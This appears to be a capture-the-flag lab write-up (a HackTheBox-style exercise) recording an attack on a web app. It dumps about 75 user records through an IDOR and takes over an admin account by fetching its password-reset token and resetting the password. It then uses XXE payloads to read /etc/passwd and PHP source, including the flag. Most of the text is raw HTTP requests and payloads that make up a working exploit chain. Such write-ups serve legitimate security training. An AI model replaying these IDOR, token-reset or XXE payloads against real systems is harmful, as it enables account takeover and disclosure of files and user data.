found IDOR: 

GET /api.php/user/{4} HTTP/1.1
Host: 94.237.58.3:35906
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.58.3:35906/profile.php
DNT: 1
Connection: close
Cookie: PHPSESSID=7q7gkdbp8ru14sinbavgpfa573; uid=1
Sec-GPC: 1


changing the value of 4 will show diffrent accounts 

first 75 accounts: 

{"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}{"uid":"2","username":"a.sumner","full_name":"Ari Sumner","company":"Friesen Group"}{"uid":"3","username":"j.oshaughnessy","full_name":"Jeevan Oshaughnessy","company":"Jaskolski - Lang"}{"uid":"4","username":"r.trainor","full_name":"Riggs Trainor","company":"Beer, Daugherty and Lang"}{"uid":"5","username":"j.bigelow","full_name":"Jakari Bigelow","company":"Ritchie - Hettinger"}{"uid":"6","username":"k.windsor","full_name":"Kahlan Windsor","company":"Rutherford LLC"}{"uid":"7","username":"w.amador","full_name":"Whitley Amador","company":"Howell and Sons"}{"uid":"8","username":"k.parrett","full_name":"Kristie Parrett","company":"Raynor Inc"}{"uid":"9","username":"g.fetter","full_name":"Guiliana Fetter","company":"Mann - Doyle"}{"uid":"10","username":"h.chaudhry","full_name":"Huxton Chaudhry","company":"Volkman - Satterfield"}{"uid":"11","username":"c.hall","full_name":"Charlotte Hall","company":"Reichel - Tillman"}{"uid":"12","username":"z.mccurdy","full_name":"Zyon Mccurdy","company":"Wintheiser - Altenwerth"}{"uid":"13","username":"p.whitman","full_name":"Paula Whitman","company":"Rath Inc"}{"uid":"14","username":"z.soria","full_name":"Zackery Soria","company":"Altenwerth - Haag"}{"uid":"15","username":"b.moriarty","full_name":"Brandi Moriarty","company":"Veum - Bechtelar"}{"uid":"16","username":"z.burdette","full_name":"Zadie Burdette","company":"Jakubowski, Reichert and Champlin"}{"uid":"17","username":"s.mandujano","full_name":"Sofi Mandujano","company":"Lind - Schiller"}{"uid":"18","username":"e.mohammad","full_name":"Emiyah Mohammad","company":"Jones - Stanton"}{"uid":"19","username":"d.tyndall","full_name":"Dottie Tyndall","company":"Hauck Inc"}{"uid":"20","username":"k.felice","full_name":"Kendalynn Felice","company":"Gislason, Grant and Beatty"}{"uid":"21","username":"r.tseng","full_name":"Rianna Tseng","company":"West - Lakin"}{"uid":"22","username":"k.deleon","full_name":"Kameron Deleon","company":"Muller - Bogisich"}{"uid":"23","username":"r.galloway","full_name":"Raven Galloway","company":"Hermann, Ankunding and Beier"}{"uid":"24","username":"d.lira","full_name":"Demarion Lira","company":"Stoltenberg - Hodkiewicz"}{"uid":"25","username":"m.mcatee","full_name":"Monet Mcatee","company":"Lubowitz, Schoen and Barrows"}{"uid":"26","username":"n.mcfadden","full_name":"Nasir Mcfadden","company":"Crooks - Kub"}{"uid":"27","username":"b.collett","full_name":"Braelyn Collett","company":"Lakin Inc"}{"uid":"28","username":"f.lara","full_name":"Felix Lara","company":"Hayes, Koelpin and Murazik"}{"uid":"29","username":"a.arneson","full_name":"Airam Arneson","company":"Osinski, Sawayn and West"}{"uid":"30","username":"k.wilkerson","full_name":"Kamila Wilkerson","company":"Brown, Willms and Quitzon"}{"uid":"31","username":"a.nations","full_name":"Aadvik Nations","company":"Jakubowski - Medhurst"}{"uid":"32","username":"a.bustillos","full_name":"Anabell Bustillos","company":"Hamill Group"}{"uid":"33","username":"a.zelaya","full_name":"Amani Zelaya","company":"Huel, Kris and Considine"}{"uid":"34","username":"a.mobley","full_name":"Alena Mobley","company":"Bayer - Tromp"}{"uid":"35","username":"j.triplett","full_name":"Javon Triplett","company":"Lehner - Dietrich"}{"uid":"36","username":"b.worthy","full_name":"Brentlee Worthy","company":"Brakus Group"}{"uid":"37","username":"l.hammons","full_name":"Letty Hammons","company":"Bogisich, Purdy and Rogahn"}{"uid":"38","username":"s.mcauley","full_name":"Steel Mcauley","company":"Cummerata and Sons"}{"uid":"39","username":"o.powe","full_name":"Oumou Powe","company":"Parker, Feeney and Buckridge"}{"uid":"40","username":"c.cogan","full_name":"Clarisa Cogan","company":"Rohan, Johnson and Flatley"}{"uid":"41","username":"r.goings","full_name":"Ram Goings","company":"Jacobson, Kertzmann and Jacobi"}{"uid":"42","username":"a.yin","full_name":"Asaad Yin","company":"Leuschke, Klocko and Bruen"}{"uid":"43","username":"j.rosenberger","full_name":"Jean Rosenberger","company":"Morar, Schuster and Johns"}{"uid":"44","username":"p.klein","full_name":"Paul Klein","company":"Kautzer, Connelly and McKenzie"}{"uid":"45","username":"n.cochrane","full_name":"Nehemias Cochrane","company":"Osinski, Haag and Conn"}{"uid":"46","username":"j.rigsby","full_name":"Jalissa Rigsby","company":"Ward - O'Kon"}{"uid":"47","username":"t.fairchild","full_name":"Toni Fairchild","company":"Bergnaum - Stiedemann"}{"uid":"48","username":"k.ambrosio","full_name":"Katai Ambrosio","company":"Borer Inc"}{"uid":"49","username":"m.hunnicutt","full_name":"Marty Hunnicutt","company":"Glover - Russel"}{"uid":"50","username":"r.raby","full_name":"Rafaela Raby","company":"Okuneva - Mayert"}{"uid":"51","username":"a.batres","full_name":"Abir Batres","company":"Rosenbaum LLC"}<span style="color:rgb(255, 0, 0)">{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}</span>{"uid":"53","username":"n.downs","full_name":"Nico Downs","company":"Welch, Collier and Gulgowski"}{"uid":"54","username":"d.holcomb","full_name":"Darren Holcomb","company":"Reynolds, Keebler and Lindgren"}{"uid":"55","username":"j.holmberg","full_name":"Jayliana Holmberg","company":"Haag - Douglas"}{"uid":"56","username":"i.durbin","full_name":"Isabell Durbin","company":"Goyette - Mraz"}{"uid":"57","username":"d.mcgee","full_name":"Daisy Mcgee","company":"Rodriguez, Windler and Hartmann"}{"uid":"58","username":"d.jumper","full_name":"Darek Jumper","company":"Kihn, Hickle and Wilderman"}{"uid":"59","username":"e.mckinzie","full_name":"Emre Mckinzie","company":"Heathcote - Bechtelar"}{"uid":"60","username":"c.paz","full_name":"Camron Paz","company":"Bernier, Stamm and Ankunding"}{"uid":"61","username":"s.shiver","full_name":"Siana Shiver","company":"Bernhard, Jerde and Bashirian"}{"uid":"62","username":"a.lankford","full_name":"Ayvah Lankford","company":"Oberbrunner, Wyman and Ledner"}{"uid":"63","username":"k.flint","full_name":"Khalid Flint","company":"Halvorson Inc"}{"uid":"64","username":"r.kozlowski","full_name":"Rome Kozlowski","company":"Lubowitz - Leannon"}{"uid":"65","username":"r.wellman","full_name":"Renesmee Wellman","company":"Bernhard and Sons"}{"uid":"66","username":"e.canady","full_name":"Emrie Canady","company":"Bashirian - Medhurst"}{"uid":"67","username":"r.kwon","full_name":"Roselynn Kwon","company":"Schimmel - Jakubowski"}{"uid":"68","username":"k.zarate","full_name":"Karmen Zarate","company":"Shanahan Group"}{"uid":"69","username":"h.farlow","full_name":"Hisham Farlow","company":"Lockman Group"}{"uid":"70","username":"m.urias","full_name":"Malika Urias","company":"Willms LLC"}{"uid":"71","username":"m.farrington","full_name":"Micaiah Farrington","company":"Legros - Schulist"}{"uid":"72","username":"a.tolman","full_name":"Anand Tolman","company":"Schamberger and Sons"}{"uid":"73","username":"s.nutt","full_name":"Sequoia Nutt","company":"Wiza - Abernathy"}{"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}{"uid":"75","username":"h.ray","full_name":"Harrison Ray","company":"Satterfield, Schultz and Kemmer"}

<span style="color:rgb(255, 0, 0)">found admin user? </span> 

found password reset function at /reset.php 
maybe we can reset the password of the Admin user? 

To get token for user 52:

GET /api.php/token/52 HTTP/1.1
Host: 94.237.49.212:42852
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:42852/settings.php
DNT: 1
Connection: close
Cookie: PHPSESSID=4o7opq5pp3o345cnf27ig2t23e; uid=52
Sec-GPC: 1

token: e51a85fa-17ac-11ec-8e51-e78234eb7b0c

had to change request method to GET to make it work: 

GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=123 HTTP/1.1
Host: 94.237.49.212:42852
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:42852/settings.php
Origin: http://94.237.49.212:42852
DNT: 1
Connection: close
Cookie: PHPSESSID=4o7opq5pp3o345cnf27ig2t23e; uid=74
Sec-GPC: 1

<span style="color:rgb(255, 0, 0)">(in get requests the parameters are send in the URL)</span> 

now i have acces to user 52? 
yes!
he seems to be admin 

XML request to add event: 

POST /addEvent.php HTTP/1.1
Host: 94.237.49.212:42852
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:42852/event.php
Content-Type: text/plain;charset=UTF-8
Content-Length: 148
Origin: http://94.237.49.212:42852
DNT: 1
Connection: close
Cookie: PHPSESSID=4o7opq5pp3o345cnf27ig2t23e; uid=52
Sec-GPC: 1


            <root>
            <name>1</name>
            <details>2</details>
            <date>2024-07-22</date>
            </root>

ressponse: 

HTTP/1.1 200 OK
Date: Sun, 21 Jul 2024 08:43:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 27
Connection: close
Content-Type: text/html; charset=UTF-8

Event '1' has been created.

parameter name seems to reflect so thats the injection point 

it is vulnerable to XXE injection 

test: 
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
            <root>
            <name>
&company;
</name>
            <details>2</details>
            <date>2024-07-22</date>
            </root>

was able to read etc/passw file using 
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

use this to read php files: 

<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

...&company;....


index.php: 

<?php
session_start();
include "config.php";
$error = '';

if ($_SESSION['username']) {
  header("Location: /profile.php", TRUE, 301);
  exit();
}

if (isset($_POST['username']) && isset($_POST['password'])) {
  if ($stmt = $conn->prepare('SELECT uid, password FROM login WHERE username = ?')) {
    $stmt->bind_param('s', $_POST['username']);
    $stmt->execute();
    $stmt->store_result();
    if ($stmt->num_rows > 0) {
      $stmt->bind_result($id, $password);
      $stmt->fetch();
      $stmt->close();
      if (md5($_POST['password']) === $password) {
        $_SESSION['username'] = $_POST['username'];
        $_SESSION['uid'] = $id;
        setcookie('uid', $id, time() + (86400 * 30), "/");
        header("Location: /profile.php", TRUE, 301);
        exit();
      } else {
        // Incorrect password
        $error =
          'Invalid login!';
      }
    } else {
      // Incorrect username
      $error =
        'Invalid login!';
    }
  } else {
    $error =
      'Invalid login!';
  }
}
?>

<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet">
  <link rel="stylesheet" href="./style.css">

</head>

<body>

  <body class="align">
    <div class="grid">
      <form action="/index.php" method="POST" class="form login">

        <div class="form__field">
          <label for="login__username"><svg class="icon">
              <use xlink:href="#icon-user"></use>
            </svg><span class="hidden">Username</span></label>
          <input autocomplete="username" id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
        </div>

        <div class="form__field">
          <label for="login__password"><svg class="icon">
              <use xlink:href="#icon-lock"></use>
            </svg><span class="hidden">Password</span></label>
          <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
        </div>

        <div class="form__field">
          <input type="submit" value="Sign In">
        </div>

      </form>
      <p class="text--center">
        <?php echo $error; ?>
      </p>
    </div>

    <svg xmlns="http://www.w3.org/2000/svg" class="icons">
      <symbol id="icon-arrow-right" viewBox="0 0 1792 1792">
        <path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z" />
      </symbol>
      <symbol id="icon-lock" viewBox="0 0 1792 1792">
        <path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z" />
      </symbol>
      <symbol id="icon-user" viewBox="0 0 1792 1792">
        <path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z" />
      </symbol>
    </svg>
  </body>

</body>

to get the flag: 

POST /addEvent.php HTTP/1.1
Host: 94.237.49.212:42852
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:42852/event.php
Content-Type: text/plain;charset=UTF-8
Content-Length: 267
Origin: http://94.237.49.212:42852
DNT: 1
Connection: close
Cookie: PHPSESSID=4o7opq5pp3o345cnf27ig2t23e; uid=52
Sec-GPC: 1

<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>

            <root>
            <name>
&company;
</name>
            <details>2</details>
            <date>2024-07-22</date>
            </root>

now just base64 decode the flag 
